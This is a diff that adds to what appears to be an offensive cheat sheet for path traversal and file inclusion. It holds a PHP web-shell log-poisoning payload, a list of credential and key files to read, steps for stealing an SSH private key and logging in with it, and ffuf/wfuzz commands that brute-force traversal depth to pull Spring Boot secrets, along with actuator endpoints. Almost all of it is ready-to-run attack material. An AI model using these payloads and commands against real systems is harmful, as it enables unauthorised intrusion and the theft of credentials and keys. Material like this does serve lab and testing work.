@@ -44,3 +44,16 @@ ssh '<?php system($_GET[0]);?>'@TARGET                    # into /var/log/auth.l
 /root/proof.txt  /home/*/local.txt  /var/www/html/.env  /var/www/html/config.php
 /proc/self/cmdline  ~/.ssh/id_rsa  /etc/mysql/my.cnf
 C:\inetpub\wwwroot\web.config  C:\Users\Administrator\Desktop\proof.txt
+
+## id_rsa -> SSH pivot (read a private key via traversal, then log in)
+# ?page=../../../../../home/<user>/.ssh/id_rsa   (user from /etc/passwd home field)
+chmod 600 id_rsa ; ssh -i id_rsa -p <port> <user>@<target>   # note nmap's SSH port (often 2222)
+
+## Spring Boot / Java — the config holds creds/API keys. Depth varies, so fuzz PATH x FILE:
+# build two wordlists and cluster-bomb them at the vulnerable param:
+#   paths.txt: ../  ../../  ../../../ ... ../../../../../../
+#   files.txt: application.properties  application.yml  config/application.properties  WEB-INF/classes/application.properties
+ffuf -u 'http://target/page?file=PATHFILE' -w paths.txt:PATH -w files.txt:FILE -mode clusterbomb -fs 0
+wfuzz -w paths.txt -w files.txt --hh 0 'http://target/page?file=FUZZFUZ2Z'
+# then read it directly, e.g.  ?file=../config/application.properties   (grep for password/secret/api-key)
+/actuator/env  /actuator/heapdump  /actuator/mappings    # if Spring actuator is exposed
